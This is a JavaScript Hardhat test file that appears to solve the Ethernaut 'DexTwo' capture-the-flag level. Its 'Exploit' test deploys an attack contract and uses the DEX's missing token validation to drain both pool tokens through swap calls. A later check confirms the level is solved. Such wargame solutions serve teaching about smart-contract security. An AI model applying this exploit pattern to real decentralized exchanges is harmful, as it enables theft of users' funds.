const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("DexTwo", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("DexTwo", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // The difference between this DEX and the previous one is the missing check
        // which validates if the tokens passed are correct.

        const token1 = (await ethers.getContractFactory("SwappableTokenTwo")).attach(await instance.token1());
        const token2 = (await ethers.getContractFactory("SwappableTokenTwo")).attach(await instance.token2());

        const attacker = await (await ethers.getContractFactory("DexTwoAttack")).deploy(instance.address);

        await instance.swap(attacker.address, token1.address, ethers.constants.One);
        await instance.swap(attacker.address, token2.address, ethers.constants.One);
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});